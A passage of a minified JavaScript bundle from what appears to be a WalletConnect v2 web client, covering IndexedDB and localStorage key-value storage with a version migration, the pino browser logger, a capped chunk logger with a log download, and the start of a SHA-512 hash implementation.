o()}},async unwatch(){e.watchListeners=[],await o()},mount(l,u){if(l=Wi(l),l&&e.mounts[l])throw new Error(`already mounted at ${l}`);return l&&(e.mountpoints.push(l),e.mountpoints.sort((h,f)=>f.length-h.length)),e.mounts[l]=u,e.watching&&Promise.resolve(Nl(u,i,l)).then(h=>{e.unwatch[l]=h}).catch(console.error),c},async unmount(l,u=!0){l=Wi(l),!(!l||!e.mounts[l])&&(e.watching&&l in e.unwatch&&(e.unwatch[l]?.(),delete e.unwatch[l]),u&&await Ul(e.mounts[l]),e.mountpoints=e.mountpoints.filter(h=>h!==l),delete e.mounts[l])},getMount(l=""){l=Je(l)+":";const u=n(l);return{driver:u.driver,base:u.base}},getMounts(l="",u={}){return l=Je(l),r(l,u.parents).map(f=>({driver:f.driver,base:f.mountpoint}))},keys:(l,u={})=>c.getKeys(l,u),get:(l,u={})=>c.getItem(l,u),set:(l,u,h={})=>c.setItem(l,u,h),has:(l,u={})=>c.hasItem(l,u),del:(l,u={})=>c.removeItem(l,u),remove:(l,u={})=>c.removeItem(l,u)};return c}function Nl(t,e,n){return t.watch?t.watch((r,i)=>e(r,n+i)):()=>{}}async function Ul(t){typeof t.dispose=="function"&&await De(t.dispose)}function lr(t){return new Promise((e,n)=>{t.oncomplete=t.onsuccess=()=>e(t.result),t.onabort=t.onerror=()=>n(t.error)})}function Kf(t,e){const n=indexedDB.open(t);n.onupgradeneeded=()=>n.result.createObjectStore(e);const r=lr(n);return(i,s)=>r.then(o=>s(o.transaction(e,i).objectStore(e)))}let bo;function Ci(){return bo||(bo=Kf("keyval-store","keyval")),bo}function Ml(t,e=Ci()){return e("readonly",n=>lr(n.get(t)))}function A0(t,e,n=Ci()){return n("readwrite",r=>(r.put(e,t),lr(r.transaction)))}function O0(t,e=Ci()){return e("readwrite",n=>(n.delete(t),lr(n.transaction)))}function $0(t=Ci()){return t("readwrite",e=>(e.clear(),lr(e.transaction)))}function C0(t,e){return t.openCursor().onsuccess=function(){this.result&&(e(this.result),this.result.continue())},lr(t.transaction)}function P0(t=Ci()){return t("readonly",e=>{if(e.getAllKeys)return lr(e.getAllKeys());const n=[];return C0(e,r=>n.push(r.key)).then(()=>n)})}const T0=t=>JSON.stringify(t,(e,n)=>typeof n=="bigint"?n.toString()+"n":n),B0=t=>{const e=/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g,n=t.replace(e,'$1"$2n"$3');return JSON.parse(n,(r,i)=>typeof i=="string"&&i.match(/^\d+n$/)?BigInt(i.substring(0,i.length-1)):i)};function Br(t){if(typeof t!="string")throw new Error(`Cannot safe json parse value of type ${typeof t}`);try{return B0(t)}catch{return t}}function rr(t){return typeof t=="string"?t:T0(t)||""}const R0="idb-keyval";var k0=(t={})=>{const e=t.base&&t.base.length>0?`${t.base}:`:"",n=i=>e+i;let r;return t.dbName&&t.storeName&&(r=Kf(t.dbName,t.storeName)),{name:R0,options:t,async hasItem(i){return!(typeof await Ml(n(i),r)>"u")},async getItem(i){return await Ml(n(i),r)??null},setItem(i,s){return A0(n(i),s,r)},removeItem(i){return O0(n(i),r)},getKeys(){return P0(r)},clear(){return $0(r)}}};const N0="WALLET_CONNECT_V2_INDEXED_DB",U0="keyvaluestorage";let M0=class{constructor(){this.indexedDb=D0({driver:k0({dbName:N0,storeName:U0})})}async getKeys(){return this.indexedDb.getKeys()}async getEntries(){return(await this.indexedDb.getItems(await this.indexedDb.getKeys())).map(e=>[e.key,e.value])}async getItem(e){const n=await this.indexedDb.getItem(e);if(n!==null)return n}async setItem(e,n){await this.indexedDb.setItem(e,rr(n))}async removeItem(e){await this.indexedDb.removeItem(e)}};var vo=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},us={exports:{}};(function(){let t;function e(){}t=e,t.prototype.getItem=function(n){return this.hasOwnProperty(n)?String(this[n]):null},t.prototype.setItem=function(n,r){this[n]=String(r)},t.prototype.removeItem=function(n){delete this[n]},t.prototype.clear=function(){const n=this;Object.keys(n).forEach(function(r){n[r]=void 0,delete n[r]})},t.prototype.key=function(n){return n=n||0,Object.keys(this)[n]},t.prototype.__defineGetter__("length",function(){return Object.keys(this).length}),typeof vo<"u"&&vo.localStorage?us.exports=vo.localStorage:typeof window<"u"&&window.localStorage?us.exports=window.localStorage:us.exports=new e})();function L0(t){var e;return[t[0],Br((e=t[1])!=null?e:"")]}let F0=class{constructor(){this.localStorage=us.exports}async getKeys(){return Object.keys(this.localStorage)}async getEntries(){return Object.entries(this.localStorage).map(L0)}async getItem(e){const n=this.localStorage.getItem(e);if(n!==null)return Br(n)}async setItem(e,n){this.localStorage.setItem(e,rr(n))}async removeItem(e){this.localStorage.removeItem(e)}};const j0="wc_storage_version",Ll=1,q0=async(t,e,n)=>{const r=j0,i=await e.getItem(r);if(i&&i>=Ll){n(e);return}const s=await t.getKeys();if(!s.length){n(e);return}const o=[];for(;s.length;){const a=s.shift();if(!a)continue;const c=a.toLowerCase();if(c.includes("wc@")||c.includes("walletconnect")||c.includes("wc_")||c.includes("wallet_connect")){const l=await t.getItem(a);await e.setItem(a,l),o.push(a)}}await e.setItem(r,Ll),n(e),z0(t,o)},z0=async(t,e)=>{e.length&&e.forEach(async n=>{await t.removeItem(n)})};let V0=class{constructor(){this.initialized=!1,this.setInitialized=n=>{this.storage=n,this.initialized=!0};const e=new F0;this.storage=e;try{const n=new M0;q0(e,n,this.setInitialized)}catch{this.initialized=!0}}async getKeys(){return await this.initialize(),this.storage.getKeys()}async getEntries(){return await this.initialize(),this.storage.getEntries()}async getItem(e){return await this.initialize(),this.storage.getItem(e)}async setItem(e,n){return await this.initialize(),this.storage.setItem(e,n)}async removeItem(e){return await this.initialize(),this.storage.removeItem(e)}async initialize(){this.initialized||await new Promise(e=>{const n=setInterval(()=>{this.initialized&&(clearInterval(n),e())},20)})}};var Hr={exports:{}},Eo,Fl;function W0(){if(Fl)return Eo;Fl=1;function t(n){try{return JSON.stringify(n)}catch{return'"[Circular]"'}}Eo=e;function e(n,r,i){var s=i&&i.stringify||t,o=1;if(typeof n=="object"&&n!==null){var a=r.length+o;if(a===1)return n;var c=new Array(a);c[0]=s(n);for(var l=1;l<a;l++)c[l]=s(r[l]);return c.join(" ")}if(typeof n!="string")return n;var u=r.length;if(u===0)return n;for(var h="",f=1-o,p=-1,d=n&&n.length||0,g=0;g<d;){if(n.charCodeAt(g)===37&&g+1<d){switch(p=p>-1?p:0,n.charCodeAt(g+1)){case 100:case 102:if(f>=u||r[f]==null)break;p<g&&(h+=n.slice(p,g)),h+=Number(r[f]),p=g+2,g++;break;case 105:if(f>=u||r[f]==null)break;p<g&&(h+=n.slice(p,g)),h+=Math.floor(Number(r[f])),p=g+2,g++;break;case 79:case 111:case 106:if(f>=u||r[f]===void 0)break;p<g&&(h+=n.slice(p,g));var w=typeof r[f];if(w==="string"){h+="'"+r[f]+"'",p=g+2,g++;break}if(w==="function"){h+=r[f].name||"<anonymous>",p=g+2,g++;break}h+=s(r[f]),p=g+2,g++;break;case 115:if(f>=u)break;p<g&&(h+=n.slice(p,g)),h+=String(r[f]),p=g+2,g++;break;case 37:p<g&&(h+=n.slice(p,g)),h+="%",p=g+2,g++,f--;break}++f}++g}return p===-1?n:(p<d&&(h+=n.slice(p)),h)}return Eo}var jl;function K0(){if(jl)return Hr.exports;jl=1;const t=W0();Hr.exports=u;const e=P().console||{},n={mapHttpRequest:B,mapHttpResponse:B,wrapRequestSerializer:k,wrapResponseSerializer:k,wrapErrorSerializer:k,req:B,res:B,err:x,errWithCause:x};function r(y,m){return y==="silent"?1/0:m.levels.values[y]}const i=Symbol("pino.logFuncs"),s=Symbol("pino.hierarchy"),o={error:"log",fatal:"error",warn:"error",info:"log",debug:"log",trace:"log"};function a(y,m){const I={logger:m,parent:y[s]};m[s]=I}function c(y,m,I){const T={};m.forEach(A=>{T[A]=I[A]?I[A]:e[A]||e[o[A]||"log"]||$}),y[i]=T}function l(y,m){return Array.isArray(y)?y.filter(function(T){return T!=="!stdSerializers.err"}):y===!0?Object.keys(m):!1}function u(y){y=y||{},y.browser=y.browser||{};const m=y.browser.transmit;if(m&&typeof m.send!="function")throw Error("pino: transmit option must have a send function");const I=y.browser.write||e;y.browser.write&&(y.browser.asObject=!0);const T=y.serializers||{},A=l(y.browser.serialize,T);let R=y.browser.serialize;Array.isArray(y.browser.serialize)&&y.browser.serialize.indexOf("!stdSerializers.err")>-1&&(R=!1);const U=Object.keys(y.customLevels||{}),M=["error","fatal","warn","info","debug","trace"].concat(U);typeof I=="function"&&M.forEach(function(Y){I[Y]=I}),(y.enabled===!1||y.browser.disabled)&&(y.level="silent");const q=y.level||"info",L=Object.create(I);L.log||(L.log=$),c(L,M,I),a({},L),Object.defineProperty(L,"levelVal",{get:K}),Object.defineProperty(L,"level",{get:G,set:Z});const j={transmit:m,serialize:A,asObject:y.browser.asObject,asObjectBindingsOnly:y.browser.asObjectBindingsOnly,formatters:y.browser.formatters,levels:M,timestamp:O(y),messageKey:y.messageKey||"msg",onChild:y.onChild||$};L.levels=h(y),L.level=q,L.isLevelEnabled=function(Y){return this.levels.values[Y]?this.levels.values[Y]>=this.levels.values[this.level]:!1},L.setMaxListeners=L.getMaxListeners=L.emit=L.addListener=L.on=L.prependListener=L.once=L.prependOnceListener=L.removeListener=L.removeAllListeners=L.listeners=L.listenerCount=L.eventNames=L.write=L.flush=$,L.serializers=T,L._serialize=A,L._stdErrSerialize=R,L.child=function(...Y){return H.call(this,j,...Y)},m&&(L._logEvent=b());function K(){return r(this.level,this)}function G(){return this._level}function Z(Y){if(Y!=="silent"&&!this.levels.values[Y])throw Error("unknown level "+Y);this._level=Y,d(this,j,L,"error"),d(this,j,L,"fatal"),d(this,j,L,"warn"),d(this,j,L,"info"),d(this,j,L,"debug"),d(this,j,L,"trace"),U.forEach(te=>{d(this,j,L,te)})}function H(Y,te,ue){if(!te)throw new Error("missing bindings for child Pino");ue=ue||{},A&&te.serializers&&(ue.serializers=te.serializers);const pe=ue.serializers;if(A&&pe){var ye=Object.assign({},T,pe),at=y.browser.serialize===!0?Object.keys(ye):A;delete te.serializers,C([te],at,ye,this._stdErrSerialize)}function Nn(dr){this._childLevel=(dr._childLevel|0)+1,this.bindings=te,ye&&(this.serializers=ye,this._serialize=at),m&&(this._logEvent=b([].concat(dr._logEvent.bindings,te)))}Nn.prototype=this;const Un=new Nn(this);return a(this,Un),Un.child=function(...dr){return H.call(this,Y,...dr)},Un.level=ue.level||this.level,Y.onChild(Un),Un}return L}function h(y){const m=y.customLevels||{},I=Object.assign({},u.levels.values,m),T=Object.assign({},u.levels.labels,f(m));return{values:I,labels:T}}function f(y){const m={};return Object.keys(y).forEach(function(I){m[y[I]]=I}),m}u.levels={values:{fatal:60,error:50,warn:40,info:30,debug:20,trace:10},labels:{10:"trace",20:"debug",30:"info",40:"warn",50:"error",60:"fatal"}},u.stdSerializers=n,u.stdTimeFunctions=Object.assign({},{nullTime:N,epochTime:E,unixTime:S,isoTime:D});function p(y){const m=[];y.bindings&&m.push(y.bindings);let I=y[s];for(;I.parent;)I=I.parent,I.logger.bindings&&m.push(I.logger.bindings);return m.reverse()}function d(y,m,I,T){if(Object.defineProperty(y,T,{value:r(y.level,I)>r(T,I)?$:I[i][T],writable:!0,enumerable:!0,configurable:!0}),y[T]===$){if(!m.transmit)return;const R=m.transmit.level||y.level,U=r(R,I);if(r(T,I)<U)return}y[T]=w(y,m,I,T);const A=p(y);A.length!==0&&(y[T]=g(A,y[T]))}function g(y,m){return function(){return m.apply(this,[...y,...arguments])}}function w(y,m,I,T){return(function(A){return function(){const U=m.timestamp(),M=new Array(arguments.length),q=Object.getPrototypeOf&&Object.getPrototypeOf(this)===e?e:this;for(var L=0;L<M.length;L++)M[L]=arguments[L];var j=!1;if(m.serialize&&(C(M,this._serialize,this.serializers,this._stdErrSerialize),j=!0),m.asObject||m.formatters?A.call(q,..._(this,T,M,U,m)):A.apply(q,M),m.transmit){const K=m.transmit.level||y._level,G=r(K,I),Z=r(T,I);if(Z<G)return;v(this,{ts:U,methodLevel:T,methodValue:Z,transmitValue:I.levels.values[m.transmit.level||y._level],send:m.transmit.send,val:r(y._level,I)},M,j)}}})(y[i][T])}function _(y,m,I,T,A){const{level:R,log:U=K=>K}=A.formatters||{},M=I.slice();let q=M[0];const L={};let j=(y._childLevel|0)+1;if(j<1&&(j=1),T&&(L.time=T),R){const K=R(m,y.levels.values[m]);Object.assign(L,K)}else L.level=y.levels.values[m];if(A.asObjectBindingsOnly){if(q!==null&&typeof q=="object")for(;j--&&typeof M[0]=="object";)Object.assign(L,M.shift());return[U(L),...M]}else{if(q!==null&&typeof q=="object"){for(;j--&&typeof M[0]=="object";)Object.assign(L,M.shift());q=M.length?t(M.shift(),M):void 0}else typeof q=="string"&&(q=t(M.shift(),M));return q!==void 0&&(L[A.messageKey]=q),[U(L)]}}function C(y,m,I,T){for(const A in y)if(T&&y[A]instanceof Error)y[A]=u.stdSerializers.err(y[A]);else if(typeof y[A]=="object"&&!Array.isArray(y[A])&&m)for(const R in y[A])m.indexOf(R)>-1&&R in I&&(y[A][R]=I[R](y[A][R]))}function v(y,m,I,T=!1){const A=m.send,R=m.ts,U=m.methodLevel,M=m.methodValue,q=m.val,L=y._logEvent.bindings;T||C(I,y._serialize||Object.keys(y.serializers),y.serializers,y._stdErrSerialize===void 0?!0:y._stdErrSerialize),y._logEvent.ts=R,y._logEvent.messages=I.filter(function(j){return L.indexOf(j)===-1}),y._logEvent.level.label=U,y._logEvent.level.value=M,A(U,y._logEvent,q),y._logEvent=b(L)}function b(y){return{ts:0,messages:[],bindings:y||[],level:{label:"",value:0}}}function x(y){const m={type:y.constructor.name,msg:y.message,stack:y.stack};for(const I in y)m[I]===void 0&&(m[I]=y[I]);return m}function O(y){return typeof y.timestamp=="function"?y.timestamp:y.timestamp===!1?N:E}function B(){return{}}function k(y){return y}function $(){}function N(){return!1}function E(){return Date.now()}function S(){return Math.round(Date.now()/1e3)}function D(){return new Date(Date.now()).toISOString()}function P(){function y(m){return typeof m<"u"&&m}try{return typeof globalThis<"u"||Object.defineProperty(Object.prototype,"globalThis",{get:function(){return delete Object.prototype.globalThis,this.globalThis=this},configurable:!0}),globalThis}catch{return y(self)||y(window)||y(this)||{}}}return Hr.exports.default=u,Hr.exports.pino=u,Hr.exports}var Sr=K0();const Hf=Ff(Sr),H0={level:"info"},zs="custom_context",xc=1e3*1024;var G0=Object.defineProperty,Y0=(t,e,n)=>e in t?G0(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Sn=(t,e,n)=>Y0(t,typeof e!="symbol"?e+"":e,n);let Z0=class{constructor(e){Sn(this,"nodeValue"),Sn(this,"sizeInBytes"),Sn(this,"next"),this.nodeValue=e,this.sizeInBytes=new TextEncoder().encode(this.nodeValue).length,this.next=null}get value(){return this.nodeValue}get size(){return this.sizeInBytes}},ql=class{constructor(e){Sn(this,"lengthInNodes"),Sn(this,"sizeInBytes"),Sn(this,"head"),Sn(this,"tail"),Sn(this,"maxSizeInBytes"),this.head=null,this.tail=null,this.lengthInNodes=0,this.maxSizeInBytes=e,this.sizeInBytes=0}append(e){const n=new Z0(e);if(n.size>this.maxSizeInBytes)throw new Error(`[LinkedList] Value too big to insert into list: ${e} with size ${n.size}`);for(;this.size+n.size>this.maxSizeInBytes;)this.shift();this.head?(this.tail&&(this.tail.next=n),this.tail=n):(this.head=n,this.tail=n),this.lengthInNodes++,this.sizeInBytes+=n.size}shift(){if(!this.head)return;const e=this.head;this.head=this.head.next,this.head||(this.tail=null),this.lengthInNodes--,this.sizeInBytes-=e.size}toArray(){const e=[];let n=this.head;for(;n!==null;)e.push(n.value),n=n.next;return e}get length(){return this.lengthInNodes}get size(){return this.sizeInBytes}toOrderedArray(){return Array.from(this)}[Symbol.iterator](){let e=this.head;return{next:()=>{if(!e)return{done:!0,value:null};const n=e.value;return e=e.next,{done:!1,value:n}}}}};var X0=Object.defineProperty,J0=(t,e,n)=>e in t?X0(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Ki=(t,e,n)=>J0(t,typeof e!="symbol"?e+"":e,n);class Gf{constructor(e,n=xc){Ki(this,"logs"),Ki(this,"level"),Ki(this,"levelValue"),Ki(this,"MAX_LOG_SIZE_IN_BYTES"),this.level=e??"error",this.levelValue=Sr.levels.values[this.level],this.MAX_LOG_SIZE_IN_BYTES=n,this.logs=new ql(this.MAX_LOG_SIZE_IN_BYTES)}forwardToConsole(e,n){n===Sr.levels.values.error?console.error(e):n===Sr.levels.values.warn?console.warn(e):n===Sr.levels.values.debug?console.debug(e):n===Sr.levels.values.trace?console.trace(e):console.log(e)}appendToLogs(e){this.logs.append(rr({timestamp:new Date().toISOString(),log:e}));const n=typeof e=="string"?JSON.parse(e).level:e.level;n>=this.levelValue&&this.forwardToConsole(e,n)}getLogs(){return this.logs}clearLogs(){this.logs=new ql(this.MAX_LOG_SIZE_IN_BYTES)}getLogArray(){return Array.from(this.logs)}logsToBlob(e){const n=this.getLogArray();return n.push(rr({extraMetadata:e})),new Blob(n,{type:"application/json"})}}var Q0=Object.defineProperty,em=(t,e,n)=>e in t?Q0(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,tm=(t,e,n)=>em(t,e+"",n);let nm=class{constructor(e,n=xc){tm(this,"baseChunkLogger"),this.baseChunkLogger=new Gf(e,n)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}downloadLogsBlobInBrowser(e){const n=URL.createObjectURL(this.logsToBlob(e)),r=document.createElement("a");r.href=n,r.download=`walletconnect-logs-${new Date().toISOString()}.txt`,document.body.appendChild(r),r.click(),document.body.removeChild(r),URL.revokeObjectURL(n)}};var rm=Object.defineProperty,im=(t,e,n)=>e in t?rm(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,sm=(t,e,n)=>im(t,e+"",n);let om=class{constructor(e,n=xc){sm(this,"baseChunkLogger"),this.baseChunkLogger=new Gf(e,n)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}};var am=Object.defineProperty,cm=Object.defineProperties,lm=Object.getOwnPropertyDescriptors,zl=Object.getOwnPropertySymbols,um=Object.prototype.hasOwnProperty,hm=Object.prototype.propertyIsEnumerable,Vl=(t,e,n)=>e in t?am(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,vs=(t,e)=>{for(var n in e||(e={}))um.call(e,n)&&Vl(t,n,e[n]);if(zl)for(var n of zl(e))hm.call(e,n)&&Vl(t,n,e[n]);return t},Es=(t,e)=>cm(t,lm(e));function fm(t){return Es(vs({},t),{level:t?.level||H0.level})}function dm(t,e,n=zs){return t[n]=e,t}function ot(t,e=zs){return t[e]||""}function pm(t,e,n=zs){const r=ot(t,n);return r.trim()?`${r}/${e}`:e}function dt(t,e,n=zs){const r=pm(t,e,n),i=t.child({context:r});return dm(i,r,n)}function gm(t){var e,n;const r=new nm((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Hf(Es(vs({},t.opts),{level:"trace",browser:Es(vs({},(n=t.opts)==null?void 0:n.browser),{write:i=>r.write(i)})})),chunkLoggerController:r}}function ym(t){var e;const n=new om((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Hf(Es(vs({},t.opts),{level:"trace"}),n),chunkLoggerController:n}}function Yf(t){return typeof t.loggerOverride<"u"&&typeof t.loggerOverride!="string"?{logger:t.loggerOverride,chunkLoggerController:null}:typeof window<"u"?gm(t):ym(t)}var mm=Object.defineProperty,wm=(t,e,n)=>e in t?mm(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Wl=(t,e,n)=>wm(t,typeof e!="symbol"?e+"":e,n);let bm=class extends ar{constructor(e){super(),this.opts=e,Wl(this,"protocol","wc"),Wl(this,"version",2)}};var vm=Object.defineProperty,Em=(t,e,n)=>e in t?vm(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,xm=(t,e,n)=>Em(t,e+"",n);class _m extends ar{constructor(e,n){super(),this.core=e,this.logger=n,xm(this,"records",new Map)}}let Im=class{constructor(e,n){this.logger=e,this.core=n}};class Sm extends ar{constructor(e,n){super(),this.relayer=e,this.logger=n}}let Dm=class extends ar{constructor(e){super()}},Am=class{constructor(e,n,r,i){this.core=e,this.logger=n,this.name=r}},Om=class extends ar{constructor(e,n){super(),this.relayer=e,this.logger=n}},$m=class extends ar{constructor(e,n){super(),this.core=e,this.logger=n}},Cm=class{constructor(e,n,r){this.core=e,this.logger=n,this.store=r}};class Pm{constructor(e,n){this.projectId=e,this.logger=n}}let Tm=class{constructor(e,n,r){this.core=e,this.logger=n,this.telemetryEnabled=r}};var Bm=Object.defineProperty,Rm=(t,e,n)=>e in t?Bm(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Kl=(t,e,n)=>Rm(t,typeof e!="symbol"?e+"":e,n);let km=class{constructor(e){this.opts=e,Kl(this,"protocol","wc"),Kl(this,"version",2)}},Nm=class{constructor(e){this.client=e}};function Um(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Zf(t,...e){if(!Um(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function Hl(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function Mm(t,e){Zf(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}const mr=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;const xo=t=>new DataView(t.buffer,t.byteOffset,t.byteLength);function Lm(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function Xf(t){return typeof t=="string"&&(t=Lm(t)),Zf(t),t}let Fm=class{clone(){return this._cloneInto()}};function jm(t){const e=r=>t().update(Xf(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function Jf(t=32){if(mr&&typeof mr.getRandomValues=="function")return mr.getRandomValues(new Uint8Array(t));if(mr&&typeof mr.randomBytes=="function")return mr.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}function qm(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(n>>i&s),a=Number(n&s),c=r?4:0,l=r?0:4;t.setUint32(e+c,o,r),t.setUint32(e+l,a,r)}let zm=class extends Fm{constructor(e,n,r,i){super(),this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=xo(this.buffer)}update(e){Hl(this);const{view:n,buffer:r,blockLen:i}=this;e=Xf(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=xo(e);for(;i<=s-o;o+=i)this.process(c,o);continue}r.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Hl(this),Mm(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:s}=this;let{pos:o}=this;n[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(r,0),o=0);for(let h=o;h<i;h++)n[h]=0;qm(r,i-8,BigInt(this.length*8),s),this.process(r,0);const a=xo(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,u[h],s)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%n&&e.buffer.set(r),e}};const Hi=BigInt(2**32-1),_a=BigInt(32);function Qf(t,e=!1){return e?{h:Number(t&Hi),l:Number(t>>_a&Hi)}:{h:Number(t>>_a&Hi)|0,l:Number(t&Hi)|0}}function Vm(t,e=!1){let n=new Uint32Array(t.length),r=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=Qf(t[i],e);[n[i],r[i]]=[s,o]}return[n,r]}const Wm=(t,e)=>BigInt(t>>>0)<<_a|BigInt(e>>>0),Km=(t,e,n)=>t>>>n,Hm=(t,e,n)=>t<<32-n|e>>>n,Gm=(t,e,n)=>t>>>n|e<<32-n,Ym=(t,e,n)=>t<<32-n|e>>>n,Zm=(t,e,n)=>t<<64-n|e>>>n-32,Xm=(t,e,n)=>t>>>n-32|e<<64-n,Jm=(t,e)=>e,Qm=(t,e)=>t,ew=(t,e,n)=>t<<n|e>>>32-n,tw=(t,e,n)=>e<<n|t>>>32-n,nw=(t,e,n)=>e<<n-32|t>>>64-n,rw=(t,e,n)=>t<<n-32|e>>>64-n;function iw(t,e,n,r){const i=(e>>>0)+(r>>>0);return{h:t+n+(i/2**32|0)|0,l:i|0}}const sw=(t,e,n)=>(t>>>0)+(e>>>0)+(n>>>0),ow=(t,e,n,r)=>e+n+r+(t/2**32|0)|0,aw=(t,e,n,r)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0),cw=(t,e,n,r,i)=>e+n+r+i+(t/2**32|0)|0,lw=(t,e,n,r,i)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0)+(i>>>0),uw=(t,e,n,r,i,s)=>e+n+r+i+s+(t/2**32|0)|0,X={fromBig:Qf,split:Vm,toBig:Wm,shrSH:Km,shrSL:Hm,rotrSH:Gm,rotrSL:Ym,rotrBH:Zm,rotrBL:Xm,rotr32H:Jm,rotr32L:Qm,rotlSH:ew,rotlSL:tw,rotlBH:nw,rotlBL:rw,add:iw,add3L:sw,add3H:ow,add4L:aw,add4H:cw,add5H:uw,add5L:lw},[hw,fw]=X.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(t=>BigInt(t))),un=new Uint32Array(80),hn=new Uint32Array(80);let dw=class extends 